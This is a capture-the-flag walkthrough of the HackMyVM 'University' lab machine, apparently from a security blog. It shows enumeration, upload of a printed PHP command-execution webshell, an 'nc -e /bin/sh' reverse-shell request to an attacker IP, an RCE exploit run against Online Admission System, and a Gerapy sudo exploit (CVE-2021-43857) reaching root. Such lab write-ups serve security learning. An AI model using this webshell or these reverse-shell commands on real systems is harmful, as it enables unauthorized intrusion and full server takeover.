---
layout: post
title: "HackMyVM - University"
date: 2022-03-28 15:47:00 +0100
categories: hmv
tag: ["RCE"]
---

Creator: [sml](https://hackmyvm.eu/profile/?user=sml)
Level: Easy
Release Date: 2022-01-19

## Scan & Enumeration

```
nmap -sC -sV -p- 192.168.1.28
```

```bash
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-28 13:41 WEST
Nmap scan report for 192.168.1.28
Host is up (0.00034s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   3072 8e:ee:da:29:f1:ae:03:a5:c3:7e:45:84:c7:86:67:ce (RSA)
|   256 f8:1c:ef:96:7b:ae:74:21:6c:9f:06:9b:20:0a:d8:56 (ECDSA)
|_  256 19:fc:94:32:41:9d:43:6f:52:c5:ba:5a:f0:83:b4:5b (ED25519)
80/tcp open  http    nginx 1.18.0
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-git: 
|   192.168.1.28:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|     Remotes:
|_      https://github.com/rskoolrash/Online-Admission-System
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: nginx/1.18.0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.17 seconds
```

### GoBuster

```
gobuster dir -u http://192.168.1.28 -x php,html,txt -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt 
```

```bash
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.28
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              html,txt,php
[+] Timeout:                 10s
===============================================================
2022/03/28 14:45:08 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 169] [--> http://192.168.1.28/images/]
/index.php            (Status: 200) [Size: 2126]                                 
/mail                 (Status: 301) [Size: 169] [--> http://192.168.1.28/mail/]  
/a.php                (Status: 200) [Size: 0]                                    
/signup.php           (Status: 200) [Size: 8008]                                 
/documents.php        (Status: 200) [Size: 6317]                                 
/admin.php            (Status: 200) [Size: 3827]                                 
/css                  (Status: 301) [Size: 169] [--> http://192.168.1.28/css/]   
/status.php           (Status: 200) [Size: 0]                                    
/tabs.php             (Status: 200) [Size: 4031]                                 
/logout.php           (Status: 302) [Size: 0] [--> index.php]                    
/captcha.php          (Status: 500) [Size: 0]                                    
/validate.php         (Status: 200) [Size: 18]                                   
/combo                (Status: 301) [Size: 169] [--> http://192.168.1.28/combo/] 
/bootstrap            (Status: 301) [Size: 169] [--> http://192.168.1.28/bootstrap/]
/editform.php         (Status: 200) [Size: 1391]                                    
/fileupload.php       (Status: 200) [Size: 1]                                       
/global_search.php    (Status: 500) [Size: 0]                                       
/jquery               (Status: 301) [Size: 169] [--> http://192.168.1.28/jquery/]   
/viewdoc.php          (Status: 200) [Size: 0]                                       
/scode                (Status: 301) [Size: 169] [--> http://192.168.1.28/scode/]    
                                                                                    
===============================================================
2022/03/28 14:48:00 Finished
===============================================================
```

## Reverse Shell

http://192.168.1.36/documents.php

### Method 1 : Upload webshell

```python
<!-- Simple PHP backdoor by DK (http://michaeldaw.org) -->

<?php

if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo "</pre>";
        die;
}

?>

Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd

<!--    http://michaeldaw.org   2006    -->
```

http://192.168.1.36/studentpic/pic.php?cmd=nc%20-e%20%2Fbin%2Fsh%20192.168.1.6%20443

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")' 
www-data@university:~/html/university/studentpic$ export TERM=xterm  
export TERM=xterm  
www-data@university:~/html/university/studentpic$ ^Z
zsh: suspended  nc -lvnp 443
                                                                                                                                                                      
┌──(adok㉿valakas)-[~/CTF]
└─$ stty raw -echo; fg  
[1]  + continued  nc -lvnp 443

www-data@university:~/html/university/studentpic$
```

### Method 2 : [Online Admission System 1.0 RCE](https://github.com/rskoolrash/Online-Admission-System)

```bash
python3 exploit.py -t 192.168.1.36 -p 80 -L 192.168.1.6 -P 4444
Exploit for Online Admission System 1.0 - Remote Code Execution (Unauthenticated)
[*] Resolving URL...
[*] Uploading the webshell payload...
[*] Setting up netcat listener...
listening on [any] 4444 ...
[*] Spawning reverse shell...
[*] Watchout!
connect to [192.168.1.6] from (UNKNOWN) [192.168.1.36] 39702
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ 
```

## Pivoting User (www-data > sandra) 

* /etc/passwd

```
www-data@university:~/html/university/studentpic$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash

....

sandra:x:1000:1000:sandra,,,:/home/sandra:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
```

* Looking for hiden files

```bash
www-data@university:~$ echo; find / -user www-data 2>/dev/null;echo

...

/var/www/html/.sandra_secret

...

```

### SSH

```bash
#Myyogaiseasy
ssh sandra@192.168.1.36
```

```bash
sandra@university:~$ sudo -l                                                                                                                                           
Matching Defaults entries for sandra on university:                                                                                                                    
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin                                                             
                                                                                                                                                                       
User sandra may run the following commands on university:                                                                                                              
    (root) NOPASSWD: /usr/local/bin/gerapy
```

## [Gerapy 0.9.7 - Remote Code Execution (RCE) (Authenticated)](https://www.exploit-db.com/exploits/50640)

### Procedure

https://github.com/Gerapy/Gerapy

```bash
sandra@university:~$ sudo /usr/local/bin/gerapy                                                                                                                        
Usage: gerapy [-v] [-h]  ...                                                                                                                                           
                                                                                                                                                                       
Gerapy 0.9.6 - Distributed Crawler Management Framework                                                                                                                

Optional arguments:
  -v, --version       Get version of Gerapy
  -h, --help          Show this help message and exit

Available commands:  
    init              Init workspace, default to gerapy
    initadmin         Create default super user admin
    runserver         Start Gerapy server
    migrate           Migrate database
    createsuperuser   Create a custom superuser
    makemigrations    Generate migrations for database
    generate          Generate Scrapy code for configurable project
    parse             Parse project for debugging
    loaddata          Load data from configs
    dumpdata          Dump data to configs

sandra@university:~$ cd /dev/shm/                                                                                                                                         

sandra@university:/dev/shm$ sudo /usr/local/bin/gerapy init                                                                                                                
Initialized workspace gerapy

sandra@university:/dev/shm$ cd gerapy/

sandra@university:/dev/shm$ sudo /usr/local/bin/gerapy migrate
Operations to perform:
  Apply all migrations: admin, auth, authtoken, contenttypes, core, django_apscheduler, sessions
Running migrations:
  Applying contenttypes.0001_initial... OK
  Applying auth.0001_initial... OK
  Applying admin.0001_initial... OK
  Applying admin.0002_logentry_remove_auto_add... OK
  Applying admin.0003_logentry_add_action_flag_choices... OK
  Applying contenttypes.0002_remove_content_type_name... OK
  Applying auth.0002_alter_permission_name_max_length... OK
  Applying auth.0003_alter_user_email_max_length... OK
  Applying auth.0004_alter_user_username_opts... OK
  Applying auth.0005_alter_user_last_login_null... OK
  Applying auth.0006_require_contenttypes_0002... OK
  Applying auth.0007_alter_validators_add_error_messages... OK
  Applying auth.0008_alter_user_username_max_length... OK
  Applying auth.0009_alter_user_last_name_max_length... OK
  Applying auth.0010_alter_group_name_max_length... OK
  Applying auth.0011_update_proxy_permissions... OK
  Applying authtoken.0001_initial... OK
  Applying authtoken.0002_auto_20160226_1747... OK
  Applying authtoken.0003_tokenproxy... OK
  Applying core.0001_initial... OK
  Applying core.0002_auto_20180119_1210... OK
  Applying core.0003_auto_20180123_2304... OK
  Applying core.0004_auto_20180124_0032... OK
  Applying core.0005_auto_20180131_1210... OK
  Applying core.0006_auto_20180131_1235... OK
  Applying core.0007_task_trigger... OK
  Applying core.0008_auto_20180703_2305... OK
  Applying core.0009_auto_20180711_2332... OK
  Applying core.0010_auto_20191027_2040... OK
  Applying django_apscheduler.0001_initial... OK
  Applying django_apscheduler.0002_auto_20180412_0758... OK
  Applying django_apscheduler.0003_auto_20200716_1632... OK
  Applying django_apscheduler.0004_auto_20200717_1043... OK
  Applying django_apscheduler.0005_migrate_name_to_id... OK
  Applying django_apscheduler.0006_remove_djangojob_name... OK
  Applying django_apscheduler.0007_auto_20200717_1404... OK
  Applying django_apscheduler.0008_remove_djangojobexecution_started... OK
  Applying sessions.0001_initial... OK

sandra@university:/dev/shm$ sudo /usr/local/bin/gerapy createsuperuser
Username (leave blank to use 'sandra'): r00t
Email address: r00t@lol.com                                                                                                                                            
Password: 
Password (again): 
This password is too short. It must contain at least 8 characters.
This password is too common.                                                                                                                                           
Bypass password validation and create user anyway? [y/N]: y                                                                                                            
Superuser created successfully.

sandra@university:/dev/shm$ sudo /usr/local/bin/gerapy runserver 0.0.0.0:1980
Watching for file changes with StatReloader                                                                                                                            
Performing system checks...                                                                                                                                            
                                                                                                                                                                       
System check identified no issues (0 silenced).                                                                                                                        
INFO - 2022-03-28 23:26:56,881 - process: 514 - scheduler.py - gerapy.server.core.scheduler - 102 - scheduler - successfully synced task with jobs with force          
March 28, 2022 - 23:26:56                                                                                                                                              
Django version 2.2.24, using settings 'gerapy.server.server.settings'                                                                                                  
Starting development server at http://0.0.0.0:1980/                                                                                                                    
Quit the server with CONTROL-C. 
```

### Command List

```
sudo /usr/local/bin/gerapy init    

cd gerapy/

sudo /usr/local/bin/gerapy migrate

sudo /usr/local/bin/gerapy createsuperuser

cd projects

sudo /usr/local/bin/gerapy init   

cd ..

sudo /usr/local/bin/gerapy runserver 0.0.0.0:1980
```

## ROOT

```bash
sandra@university:/dev/shm/gerapy$ sudo /usr/local/bin/gerapy runserver 0.0.0.0:1980
Watching for file changes with StatReloader
Performing system checks...

System check identified no issues (0 silenced).
INFO - 2022-03-29 00:14:19,681 - process: 496 - scheduler.py - gerapy.server.core.scheduler - 102 - scheduler - successfully synced task with jobs with force
March 29, 2022 - 00:14:19
Django version 2.2.24, using settings 'gerapy.server.server.settings'
Starting development server at http://0.0.0.0:1980/
Quit the server with CONTROL-C.
[29/Mar/2022 00:14:43] "GET / HTTP/1.1" 200 2530
[29/Mar/2022 00:14:46] "POST /api/user/auth HTTP/1.1" 200 52
[29/Mar/2022 00:14:49] "GET /api/project/index HTTP/1.1" 200 38
[29/Mar/2022 00:14:52] "GET /api/project/gerapy/build HTTP/1.1" 200 158
```

### Local

```bash
python3 gerapy.py -t 192.168.1.36 -p 1980 -L 192.168.1.6 -P 443
  ______     _______     ____   ___ ____  _       _  _  _____  ___ ____ _____ 
 / ___\ \   / / ____|   |___ \ / _ \___ \/ |     | || ||___ / ( _ ) ___|___  |
| |    \ \ / /|  _| _____ __) | | | |__) | |_____| || |_ |_ \ / _ \___ \  / / 
| |___  \ V / | |__|_____/ __/| |_| / __/| |_____|__   _|__) | (_) |__) |/ /  
 \____|  \_/  |_____|   |_____|\___/_____|_|        |_||____/ \___/____//_/   
                                                                              

Exploit for CVE-2021-43857
For: Gerapy < 0.9.8
[*] Resolving URL...
[*] Logging in to application...
[*] Login successful! Proceeding...
[*] Getting the project list
[*] Found project: gerapy
[*] Getting the ID of the project to build the URL
[*] Found ID of the project:  1
[*] Setting up a netcat listener
listening on [any] 443 ...
[*] Executing reverse shell payload
[*] Watchout for shell! :)
connect to [192.168.1.6] from (UNKNOWN) [192.168.1.36] 39368
root@university:/dev/shm/gerapy# id
id
uid=0(root) gid=0(root) groups=0(root)
```